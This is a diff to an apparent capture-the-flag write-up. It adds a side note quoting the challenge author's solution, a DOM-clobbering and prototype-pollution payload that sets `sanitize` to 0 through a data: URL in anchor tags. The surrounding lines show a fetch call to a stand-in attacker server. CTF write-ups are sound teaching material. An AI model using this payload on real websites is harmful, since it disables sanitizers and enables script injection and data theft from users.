@@ -293,6 +293,12 @@ will actually be
 fetch('https://attacker_server')
 ```
 
+Side note: The [official solution](https://gist.github.com/voxxal/fb69443f0a31bc6f2ddbce763d609935#sanity) from the challenge author used a different technique. By specifying the `data` value, they were able to assign the desired JSON object directly.
+```js
+<a id=debug><a id=debug name=extension href='data:;,%7B%22__proto__%22:%7B%22sanitize%22:0%7D%7D'>
+<!-- {"__proto__":{"sanitize":0}} -->
+```
+
 If, like me, you were using a `SimpleHTTPServer` with python, exposed via `ngrok` then you'll notice you didn't receive a request.
 
 Checking the console again, you'll see why.
